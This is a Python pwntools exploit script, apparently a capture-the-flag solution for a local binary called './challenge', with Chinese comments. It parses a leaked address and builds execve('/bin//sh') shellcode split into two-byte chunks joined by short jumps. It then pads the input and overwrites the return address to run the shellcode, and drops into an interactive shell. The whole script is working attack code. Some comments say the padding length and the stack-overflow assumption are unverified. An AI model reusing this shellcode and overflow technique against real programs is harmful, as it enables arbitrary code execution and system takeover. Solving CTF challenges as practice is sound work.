from pwn import *
import struct
#import time

def solve():
    # 本地运行程序（替换 socket）
    p = process("./challenge")
    
    # 读取泄露地址（比你逐字节稳定100倍）
    data = p.recvline().strip()
    print(f"[*] Leaked info: {data.decode()}")
 
    # 解析泄露地址
    leaked_str = data.decode()
    if leaked_str.startswith('0x'):
        leaked_addr = int(leaked_str, 16)
        print(f"[*] Leaked address: {hex(leaked_addr)}")
        
        # shellcode放在 mmap 后面（你原来的逻辑）
        shellcode_addr = leaked_addr + 0x100
        print(f"[*] Target address: {hex(shellcode_addr)}")

    chain = []
    # Block 0
    chain.append(b'\x01\x00\x00\x00')
 
    chunks = [
        b'\x31\xf6',
        b'\x56\x90',
        b'\x31\xc0',
        
        b'\xb4\x68',
        b'\xb0\x73',
        b'\x66\x50',
        
        b'\xb4\x2f',
        b'\xb0\x2f',
        b'\x66\x50',
        
        b'\xb4\x6e',
        b'\xb0\x69',
        b'\x66\x50',
        
        b'\xb4\x62',
        b'\xb0\x2f',
        b'\x66\x50',
        
        b'\x54\x5f',
        b'\x31\xd2',
        b'\x31\xc0',
        b'\xb0\x3b',
        b'\x0f\x05',
    ]
 
    for c in chunks:
        chain.append(c + b'\xeb\x01')
 
    payload = b"".join(chain)
    
    # 覆盖返回地址（如果题目真是栈溢出才需要）
    if 'leaked_addr' in locals():
        padding = b'A' * 64  # 这里后面要用cyclic精确算
        payload = payload + padding + struct.pack('<Q', shellcode_addr)
    
    print(f"[*] Sending payload len = {len(payload)}")
    
    # 发送payload（替换 s.sendall）
    p.send(payload)
    
    # 交互
    p.interactive()

if __name__ == "__main__":
    solve()